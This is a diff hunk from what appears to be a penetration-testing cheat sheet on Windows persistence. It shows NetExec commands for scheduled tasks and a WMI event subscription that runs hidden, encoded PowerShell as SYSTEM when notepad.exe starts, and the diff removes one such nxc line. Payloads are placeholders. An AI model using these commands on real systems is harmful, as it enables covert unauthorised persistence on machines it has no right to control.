@@ -598,7 +598,6 @@ nxc smb <ip_address> -u <user> -p <password> -M schtask_as -o CMD='whoami'
 
 # WMI event subscription — fileless, no Run key / task; lives in the WMI repo, runs as SYSTEM:
 # companion:gen wmi-subscription
-nxc smb <ip_address> -u <user> -p <password> -M wmi-event -o CONSUMER='powershell -w hidden -enc <b64>'
 Register-MaliciousWmiEvent -EventName Persist -PermanentCommand "powershell -w hidden -enc <b64>" -Trigger ProcessStart -ProcessName notepad.exe
 # companion:end wmi-subscription
 ////////////////////////////////////////
